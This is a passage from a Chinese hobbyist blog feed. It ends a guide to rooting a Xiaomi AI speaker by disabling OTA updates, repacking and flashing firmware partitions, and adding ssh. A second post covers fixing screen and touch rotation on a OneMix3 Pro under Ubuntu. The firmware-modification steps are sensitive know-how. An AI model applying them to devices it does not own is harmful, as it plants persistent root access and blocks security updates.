id="4-4-关闭-OTA"><a href="#4-4-关闭-OTA" class="headerlink" title="4.4 关闭 OTA"></a>4.4 关闭 OTA</h4><p>修改 crontab 文件，关闭 OTA 检查，以防系统更新后自启动项 &amp; ssh 密钥消失。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@S12:~# cat /etc/crontabs/root</span><br><span class="line"><span class="meta">#</span><span class="bash"> explain crontab <span class="keyword">in</span> https://crontab.guru/</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> At every 5th minute.</span></span><br><span class="line">*/5 * * * * /usr/sbin/easy_logcut size</span><br><span class="line"><span class="meta">#</span><span class="bash"> At every minute.</span></span><br><span class="line">* * * * * /usr/sbin/network_probe.sh</span><br><span class="line"><span class="meta">#</span><span class="bash"> At 04:32.</span></span><br><span class="line">32 4 * * * /usr/sbin/pns refresh</span><br><span class="line"><span class="meta">#</span><span class="bash"> At every 10th minute.</span></span><br><span class="line">*/10 * * * * /usr/bin/check_mediaplayer_status</span><br><span class="line"><span class="meta">#</span><span class="bash"> At 03:00.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">0 3 * * * /bin/ota slient  <span class="comment"># check ota</span></span></span><br></pre></td></tr></table></figure><p>通过查看 ota 脚本，发现 ota 服务器应该是 api.miwifi.com，直接在上级路由将域名屏蔽也可以。</p><h3 id="5-重新打包分区，刷入设备"><a href="#5-重新打包分区，刷入设备" class="headerlink" title="5. 重新打包分区，刷入设备"></a>5. 重新打包分区，刷入设备</h3><p>按之前查看 block size 的信息作为参数重新打包分区，不同设备型号的 block size 可能不同。</p><p>仍然用 root 操作，不然有些文件权限会出问题。另外一定要做一定的压缩，如果 img 过大，会出现刷写不完整，导致分区起不来，切换到 b 分区。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/test/Desktop/xiaomi# mksquashfs m4 m4_crack.img -b 131072 -comp xz -Xbcj arm -Xdict-size 32K -no-xattrs</span><br><span class="line">Parallel mksquashfs: Using 4 processors</span><br><span class="line">Creating 4.0 filesystem on m4_crack.img, block size 131072.</span><br><span class="line">[======================================================\] 1495/1495 100%</span><br><span class="line"></span><br><span class="line">Exportable Squashfs 4.0 filesystem, xz compressed, data block size 131072</span><br><span class="line">compressed data, compressed metadata, compressed fragments, no xattrs</span><br><span class="line">duplicates are removed</span><br><span class="line">Filesystem size 32469.29 Kbytes (31.71 Mbytes)</span><br><span class="line">46.00% of uncompressed filesystem size (70587.29 Kbytes)</span><br><span class="line">Inode table size 15932 bytes (15.56 Kbytes)</span><br><span class="line">24.82% of uncompressed inode table size (64178 bytes)</span><br><span class="line">Directory table size 17978 bytes (17.56 Kbytes)</span><br><span class="line">44.87% of uncompressed directory table size (40068 bytes)</span><br><span class="line">Number of duplicate files found 23</span><br><span class="line">Number of inodes 1763</span><br><span class="line">Number of files 1082</span><br><span class="line">Number of fragments 106</span><br><span class="line">Number of symbolic links  578</span><br><span class="line">Number of device nodes 1</span><br><span class="line">Number of fifo nodes 0</span><br><span class="line">Number of socket nodes 0</span><br><span class="line">Number of directories 102</span><br><span class="line">Number of ids (unique uids + gids) 1</span><br><span class="line">Number of uids 1</span><br><span class="line">root (0)</span><br><span class="line">Number of gids 1</span><br><span class="line">root (0)</span><br></pre></td></tr></table></figure><p>在小爱同学上删除 /tmp/m4.img，将修改后的 <code>m4_crack.img</code> 复制回小爱同学的临时目录，刷写镜像到 mtdblock4</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@S12:/tmp# mtd write m4_crack.img system0</span><br><span class="line">Unlocking system0 ...</span><br><span class="line"></span><br><span class="line">Writing from m4_crack.img to system0 ...  [w]         </span><br><span class="line">root@S12:/tmp# /usr/bin/fw_env -s boot_part boot0</span><br><span class="line">[ubootenv] update_bootenv_varible name [boot_part]: value [boot0]</span><br><span class="line">[ubootenv] Save ubootenv to /dev/nand_env succeed!</span><br></pre></td></tr></table></figure><p>如果重启OK，并且没有切到 b 分区的话，证明刷写成功，可以选择把 b 分区也刷写了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@S12:/tmp# mtd write m4_crack.img system1</span><br><span class="line">Unlocking system1 ...</span><br><span class="line"></span><br><span class="line">Writing from m4_crack.img to system1 ...  [w]         </span><br><span class="line">root@S12:/tmp# </span><br></pre></td></tr></table></figure><h3 id="6-后记"><a href="#6-后记" class="headerlink" title="6. 后记"></a>6. 后记</h3><p>从老家寄来了在 MIDC 2017 会议上的礼品，首发版 小米AI音箱，这个拆开看是黑色板子的，大概如图。</p><img src="/2020/12/01/2020-12-01/black-board.jpg" class=""><p>这个硬件型号的设备，系统没有 mount 到 ro，可以直接写。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@S12:~# mount</span><br><span class="line">rootfs on / type rootfs (rw)</span><br><span class="line">/dev/ubi0_0 on / type ubifs (rw,noatime)</span><br><span class="line">devtmpfs on /dev type devtmpfs (rw,relatime,size=115548k,nr_inodes=28887,mode=755)</span><br><span class="line">proc on /proc type proc (rw,nosuid,nodev,noexec,noatime)</span><br><span class="line">sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,noatime)</span><br><span class="line">cgroup on /sys/fs/cgroup type cgroup (rw,nosuid,nodev,noexec,relatime,debug,cpu,cpuacct,devices,freezer,net_cls,blkio)</span><br><span class="line">tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noatime)</span><br><span class="line">tmpfs on /dev type tmpfs (rw,nosuid,relatime,size=512k,mode=755)</span><br><span class="line">debugfs on /sys/kernel/debug type debugfs (rw,noatime)</span><br><span class="line">/dev/ubi1_0 on /data type ubifs (rw,relatime)</span><br><span class="line">root@S12:~#</span><br></pre></td></tr></table></figure><p>类似方法加入 ssh，禁用 ota 即可。</p><p>另外发现 <code>/tmp/mico_aivs_lab/instruction.log</code> 文件中临时存有小爱的交流日志，后面有空可以结合 homeassistant 搞一些事情。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近计划搞一搞智能音箱，从网上买了一个二手的小米AI音箱（型号MDZ-25-DA）&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="iot" scheme="https://badb100d.com/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>一号本 OneMix3 Pro Ubuntu屏幕校正</title>
    <link href="https://badb100d.com/2020/11/16/2020-11-16/"/>
    <id>https://badb100d.com/2020/11/16/2020-11-16/</id>
    <published>2020-11-16T15:51:02.000Z</published>
    <updated>2020-11-16T15:59:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>之前在一号本（OneMix3 Pro）上装的Ubuntu系统因为懒得做环境分离，终于把环境搞乱了 T_T，遂重装一下Ubuntu顺便升到最新版20.04。</p><p>一号本有点ZZ，主板层面认为屏幕是竖着的，所以除原生 win10 ，加了grub之后，grub和ubuntu默认都是竖屏的。而之前装系统的时候没有做过程记录，所以忘了上次是怎么解决“竖屏”问题的了。。。</p><p>重新google一番，主要发现以下方法。</p><a id="more"></a><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>最快速也是最丑的方法，Ubuntu默认有个服务<code>iio-sensor-proxy</code>，有点类似手机上的“屏幕旋转”，然而一号本的加速度传感器方向不是常规的方向，所以这个旋转总是往错误的方向翻转，可以卸载这个服务后，每次进入桌面手动设置屏幕方向。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 卸载服务</span></span><br><span class="line">x@One-Mix3-Pro:~$ sudo apt-get --purge remove iio-sensor-proxy</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看屏幕名称，这里看到是eDP-1</span></span><br><span class="line">x@One-Mix3-Pro:~$ xrandr --query</span><br><span class="line">Screen 0: minimum 320 x 200, current 2560 x 1600, maximum 16384 x 16384</span><br><span class="line">eDP-1 connected primary 2560x1600+0+0 left (normal left inverted right x axis y axis) 113mm x 181mm</span><br><span class="line">   1600x2560     55.86*+</span><br><span class="line">HDMI-1 disconnected (normal left inverted right x axis y axis)</span><br><span class="line">DP-1 disconnected (normal left inverted right x axis y axis)</span><br><span class="line">HDMI-2 disconnected (normal left inverted right x axis y axis)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 每次登陆执行屏幕翻转，可以写个自启动项</span></span><br><span class="line">x@One-Mix3-Pro:~$ xrandr --output eDP-1 --rotate left</span><br></pre></td></tr></table></figure><p>可以写一个gnome启动项，控制gnome每次登陆的时候执行屏幕旋转。</p><p>打开“启动应用程序”程序</p><img src="/2020/11/16/2020-11-16/startup.jpg" class=""><p>或者<code>alt + F2</code>运行<code>gnome-session-properties</code>，在其中添加旋转屏幕命令</p><img src="/2020/11/16/2020-11-16/startupapp.png" class=""><p>再或者直接shell里添加gnome启动项文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x@One-Mix3-Pro:~/.config/autostart$ cat export.desktop</span><br><span class="line">[Desktop Entry]</span><br><span class="line">Type=Application</span><br><span class="line">Exec=export DISPLAY=:0;xrandr  --output eDP-1 --rotate left</span><br><span class="line">Hidden=false</span><br><span class="line">NoDisplay=false</span><br><span class="line">X-GNOME-Autostart-enabled=true</span><br><span class="line">Name[zh_CN]=screen rotate</span><br><span class="line">Name=screen rotate</span><br><span class="line">Comment[zh_CN]=aaa</span><br><span class="line">Comment=Rotate the default screen</span><br></pre></td></tr></table></figure><p>Ubuntu 20.04上不知道为什么这个启动项经常不允许，老版本Ubuntu这个启动项还是有点用的。</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>上面的方法通过卸载“屏幕旋转”服务，使得屏幕不会被错误的旋转，但也造成屏幕没法自动旋转。不太喜欢这种因噎废食的做法，重新安装上<code>iio-sensor-proxy</code>，继续看了下其他方法。</p><p>查阅了一些<span class="exturl" data-url="aHR0cHM6Ly9naXQua2VybmVsLm9yZy9wdWIvc2NtL2xpbnV4L2tlcm5lbC9naXQvamljMjMvaWlvLmdpdC90cmVlL0RvY3VtZW50YXRpb24vQUJJL3Rlc3Rpbmcvc3lzZnMtYnVzLWlpbyNuMTYzOA==" title="https://git.kernel.org/pub/scm/linux/kernel/git/jic23/iio.git/tree/Documentation/ABI/testing/sysfs-bus-iio#n1638">文档<i class="fa fa-external-link"></i></span>，发现加速度传感器的矩阵可以手工校准，参考<span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL0dQRFBvY2tldC9jb21tZW50cy9jZTZqeHIvb25lbWl4XzNzX3lvZ2Ffd191YnVudHVfMTgwNDJfaG93X2RvX2lfdGVsbF9pdC8=" title="https://www.reddit.com/r/GPDPocket/comments/ce6jxr/onemix_3s_yoga_w_ubuntu_18042_how_do_i_tell_it/">reddit<i class="fa fa-external-link"></i></span>网友的帖子，先寻找加速度设备的名称：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /sys/`udevadm info -q path -n /dev/iio:device0`/../modalias</span><br><span class="line">acpi:BOSC0200:BOSC0200:</span><br></pre></td></tr></table></figure><p>获取到的设备名称为<code>acpi:BOSC0200:BOSC0200:</code>，增加<code>61-sensor-local.hwdb</code>配置文件，设备名为以下格式，并对<code>ACCEL_MOUNT_MATRIX</code>矩阵进行如下调整，更新硬件数据库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /etc/udev/hwdb.d/61-sensor-local.hwdb      # 修改为如下内容</span><br><span class="line">sensor:modalias:acpi:BOSC0200*:dmi:*:*</span><br><span class="line"> ACCEL_MOUNT_MATRIX= -1, 0, 0; 0, 1, 0; 0, 0, 1  # 3x3矩阵</span><br><span class="line">root@One-Mix3-Pro:~# systemd-hwdb update                            # 更新硬件数据库</span><br></pre></td></tr></table></figure><p>修改矩阵的时候可以参考<code>monitor-sensor</code>的内容，不断调整设备姿态，确定原生加速度传感器方向。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# monitor-sensor</span><br><span class="line">    Waiting for iio-sensor-proxy to appear</span><br><span class="line">+++ iio-sensor-proxy appeared</span><br><span class="line">=== Has accelerometer (orientation: left-up)</span><br><span class="line">=== No ambient light sensor</span><br><span class="line">    Accelerometer orientation changed: bottom-up</span><br><span class="line">    Accelerometer orientation changed: left-up</span><br><span class="line">    Accelerometer orientation changed: normal</span><br><span class="line">    Accelerometer orientation changed: right-up</span><br><span class="line">    Accelerometer orientation changed: normal</span><br><span class="line">    Accelerometer orientation changed: left-up</span><br><span class="line">    Accelerometer orientation changed: normal</span><br><span class="line">    Accelerometer orientation changed: left-up</span><br></pre></td></tr></table></figure><p>重启并登陆以后，屏幕基本可以按正确的重力方向进行旋转了。那么这个时候新的问题就出现了😂，触屏会偶发性的没有跟随进行旋转，这样就会导致你点右边，左边的程序启动了。。。</p><p>依旧查阅文档，发现有个输入设备的矩阵，查看当前输入设备：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">x@One-Mix3-Pro:~$ xinput --list</span><br><span class="line">⎡ Virtual core pointer                    id=2[master pointer  (3)]</span><br><span class="line">⎜   ↳ Virtual core XTEST pointer              id=4[slave  pointer  (2)]</span><br><span class="line">⎜   ↳ HAILUCK CO.,LTD USB KEYBOARD Mouse      id=11[slave  pointer  (2)]</span><br><span class="line">⎜   ↳ GXTP7386:00 27C6:0113                   id=15[slave  pointer  (2)]</span><br><span class="line">⎜   ↳ GXTP7386:00 27C6:0113 Stylus            id=16[slave  pointer  (2)]</span><br><span class="line">⎣ Virtual core keyboard                   id=3[master keyboard (2)]</span><br><span class="line">    ↳ Virtual core XTEST keyboard             id=5[slave  keyboard (3)]</span><br><span class="line">    ↳ Power Button                            id=6[slave  keyboard (3)]</span><br><span class="line">    ↳ Video Bus                               id=7[slave  keyboard (3)]</span><br><span class="line">    ↳ Power Button                            id=8[slave  keyboard (3)]</span><br><span class="line">    ↳ Sleep Button                            id=9[slave  keyboard (3)]</span><br><span class="line">    ↳ HAILUCK CO.,LTD USB KEYBOARD            id=10[slave  keyboard (3)]</span><br><span class="line">    ↳ HAILUCK CO.,LTD USB KEYBOARD System Controlid=12[slave  keyboard (3)]</span><br><span class="line">    ↳ HAILUCK CO.,LTD USB KEYBOARD Consumer Controlid=13[slave  keyboard (3)]</span><br><span class="line">    ↳ HAILUCK CO.,LTD USB KEYBOARD Wireless Radio Controlid=14[slave  keyboard (3)]</span><br><span class="line">    ↳ GXTP7386:00 27C6:0113 Keyboard          id=17[slave  keyboard (3)]</span><br><span class="line">    ↳ AT Translated Set 2 keyboard            id=18[slave  keyboard (3)]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;shell</span><br><span class="line">x@One-Mix3-Pro:~$ xinput list-props 4</span><br><span class="line">Device &#39;GXTP7386:00 27C6:0113&#39;:</span><br><span class="line">Device Enabled (168):1</span><br><span class="line">Coordinate Transformation Matrix (170):0.000000, -1.000000, 1.000000, 1.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000</span><br><span class="line">libinput Calibration Matrix (323):1.000000, 0.000000, 0.000000, 0.000000, 1.000000, 0.000000, 0.000000, 0.000000, 1.000000</span><br><span class="line">libinput Calibration Matrix Default (324):1.000000, 0.000000, 0.000000, 0.000000, 1.000000, 0.000000, 0.000000, 0.000000, 1.000000</span><br><span class="line">libinput Send Events Modes Available (288):1, 0</span><br><span class="line">libinput Send Events Mode Enabled (289):0, 0</span><br><span class="line">libinput Send Events Mode Enabled Default (290):0, 0</span><br><span class="line">Device Node (291):&quot;&#x2F;dev&#x2F;input&#x2F;event6&quot;</span><br><span class="line">Device Product ID (292):10182, 275</span><br></pre></td></tr></table></figure><p>最后写了个脚本，把屏幕旋转的部分和触摸屏识别旋转的部分合在一起，当触摸屏识别没有跟随旋转时执行一下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Screen_rotate.sh  written by badb100d</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">portrait (left)</span></span><br><span class="line">export DISPLAY=:0</span><br><span class="line">xrandr --output eDP-1 --rotate left</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 15 is the touch screen id</span></span><br><span class="line">xinput set-prop 15 --type=float &quot;Coordinate Transformation Matrix&quot; 0 -1 1 1 0 0 0 0 1</span><br></pre></td></tr></table></figure><h2 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h2><h3 id="增大grub字体"><a href="#增大grub字体" class="headerlink" title="增大grub字体"></a>增大grub字体</h3><p>grub 貌似是没法旋转的（除非patch binary），所以将就一下这个颈椎病康复版grub。不过grub的字体还是可以调的，默认字号太小。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# apt install ttf-unifont -y</span><br><span class="line">root@One-Mix3-Pro:~# grub-mkfont -s 32 -o /boot/grub/fonts/unicode32.pf2 /usr/share/fonts/truetype/unifont/unifont.ttf</span><br><span class="line">root@One-Mix3-Pro:~# vim /etc/default/grub     # 增加 GRUB_FONT=/boot/grub/fonts/unicode32.pf2</span><br><span class="line">root@One-Mix3-Pro:~# update-grub # 更新grub，再重启</span><br></pre></td></tr></table></figure><h3 id="修改-tty-下旋转模式"><a href="#修改-tty-下旋转模式" class="headerlink" title="修改 tty 下旋转模式"></a>修改 tty 下旋转模式</h3><p>GUI下的屏幕旋转解决了，但是有时候纯CUI操作效率更高，也更节约资源。默认的 tty 界面（ctrl+alt+F3）也是旋转的，通过修改 grub 启动参数进行校正：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat &#x2F;etc&#x2F;default&#x2F;grub</span><br><span class="line"># If you change this file, run &#39;update-grub&#39; afterwards to update</span><br><span class="line"># &#x2F;boot&#x2F;grub&#x2F;grub.cfg.</span><br><span class="line"># For full documentation of the options in this file, see:</span><br><span class="line">#   info -f grub -n &#39;Simple configuration&#39;</span><br><span class="line"></span><br><span class="line">GRUB_DEFAULT&#x3D;0</span><br><span class="line">GRUB_TIMEOUT_STYLE&#x3D;hidden</span><br><span class="line">GRUB_TIMEOUT&#x3D;2</span><br><span class="line">GRUB_FONT&#x3D;&#x2F;boot&#x2F;grub&#x2F;fonts&#x2F;unicode32.pf2</span><br><span class="line">GRUB_DISTRIBUTOR&#x3D;&#96;lsb_release -i -s 2&gt; &#x2F;dev&#x2F;null || echo Debian&#96;</span><br><span class="line">#GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;quiet splash&quot;</span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;video&#x3D;efifb fbcon&#x3D;rotate:3 fbcon&#x3D;rotate_all:1 quiet splash&quot;</span><br><span class="line">GRUB_CMDLINE_LINUX&#x3D;&quot;net.ifnames&#x3D;0 biosdevname&#x3D;0 video&#x3D;efifb fbcon&#x3D;rotate:3 fbcon&#x3D;rotate_all:1&quot;</span><br><span class="line"></span><br><span class="line"># Uncomment to enable BadRAM filtering, modify to suit your needs</span><br><span class="line"># This works with Linux (no patch required) and with any kernel that obtains</span><br><span class="line"># the memory map information from GRUB (GNU Mach, kernel of FreeBSD ...)</span><br><span class="line">#GRUB_BADRAM&#x3D;&quot;0x01234567,0xfefefefe,0x89abcdef,0xefefefef&quot;</span><br><span class="line"></span><br><span class="line"># Uncomment to disable graphical terminal (grub-pc only)</span><br><span class="line">#GRUB_TERMINAL&#x3D;console</span><br><span class="line"></span><br><span class="line"># The resolution used on graphical terminal</span><br><span class="line"># note that you can use only modes which your graphic card supports via VBE</span><br><span class="line"># you can see them in real GRUB with the command &#96;vbeinfo&#39;</span><br><span class="line">#GRUB_GFXMODE&#x3D;640x480</span><br><span class="line"></span><br><span class="line"># Uncomment if you don&#39;t want GRUB to pass &quot;root&#x3D;UUID&#x3D;xxx&quot; parameter to Linux</span><br><span class="line">#GRUB_DISABLE_LINUX_UUID&#x3D;true</span><br><span class="line"></span><br><span class="line"># Uncomment to disable generation of recovery mode menu entries</span><br><span class="line">#GRUB_DISABLE_RECOVERY&#x3D;&quot;true&quot;</span><br><span class="line"></span><br><span class="line"># Uncomment to get a beep at grub start</span><br><span class="line">#GRUB_INIT_TUNE&#x3D;&quot;480 440 1&quot;</span><br></pre></td></tr></table></figure><p>更新 grub 并重启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# update-grub</span><br></pre></td></tr></table></figure><h3 id="增加-tty-下中文字符支持"><a href="#增加-tty-下中文字符支持" class="headerlink" title="增加 tty 下中文字符支持"></a>增加 tty 下中文字符支持</h3><p>安装<code>fbterm</code>，配置<code>~/.fbtermrc</code>，root和普通用户都配置一下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">font-names=Ubuntu Mono</span><br><span class="line">font-size=40</span><br><span class="line">screen-rotate=3</span><br></pre></td></tr></table></figure><p>配置<code>fbterm</code>权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcap &#x27;cap_sys_tty_config+ep&#x27; /usr/bin/fbterm</span><br></pre></td></tr></table></figure><h3 id="增加-rc-local-支持"><a href="#增加-rc-local-支持" class="headerlink" title="增加 rc.local 支持"></a>增加 rc.local 支持</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /etc/systemd/system/rc-local.service</span><br><span class="line">[Unit]</span><br><span class="line"> Description=/etc/rc.local Compatibility</span><br><span class="line"> ConditionPathExists=/etc/rc.local</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line"> Type=forking</span><br><span class="line"> ExecStart=/etc/rc.local start</span><br><span class="line"> TimeoutSec=0</span><br><span class="line"> StandardOutput=tty</span><br><span class="line"> RemainAfterExit=yes</span><br><span class="line"> SysVStartPriority=99</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line"> WantedBy=multi-user.target</span><br><span class="line"> </span><br><span class="line">root@One-Mix3-Pro:~# systemctl enable rc-local; touch /etc/rc.local; chmod +x /etc/rc.local</span><br></pre></td></tr></table></figure><h3 id="无线网卡不休眠"><a href="#无线网卡不休眠" class="headerlink" title="无线网卡不休眠"></a>无线网卡不休眠</h3><p>查看，并修改无线网卡状态（重启失效）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# iw dev wlan0 get power_save</span><br><span class="line">Power save: on</span><br><span class="line">root@One-Mix3-Pro:~# iw dev wlan0 set power_save off</span><br></pre></td></tr></table></figure><p>修改无线网卡配置（重启不失效）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /etc/NetworkManager/conf.d/default-wifi-powersave-on.conf</span><br><span class="line">[connection]</span><br><span class="line">wifi.powersave = 2</span><br></pre></td></tr></table></figure><h3 id="安装VNC（系统自带的太辣鸡）"><a href="#安装VNC（系统自带的太辣鸡）" class="headerlink" title="安装VNC（系统自带的太辣鸡）"></a>安装VNC（系统自带的太辣鸡）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# wget https://www.realvnc.com/download/file/vnc.files/VNC-Server-6.7.2-Linux-x64.deb</span><br><span class="line">root@One-Mix3-Pro:~# dpkg -i VNC-Server-6.7.2-Linux-x64.deb</span><br></pre></td></tr></table></figure><h3 id="盒盖不休眠"><a href="#盒盖不休眠" class="headerlink" title="盒盖不休眠"></a>盒盖不休眠</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# echo &quot;HandleLidSwitchExternalPower=ignore&quot; &gt;&gt; /etc/systemd/logind.conf</span><br><span class="line">root@One-Mix3-Pro:~# systemctl restart 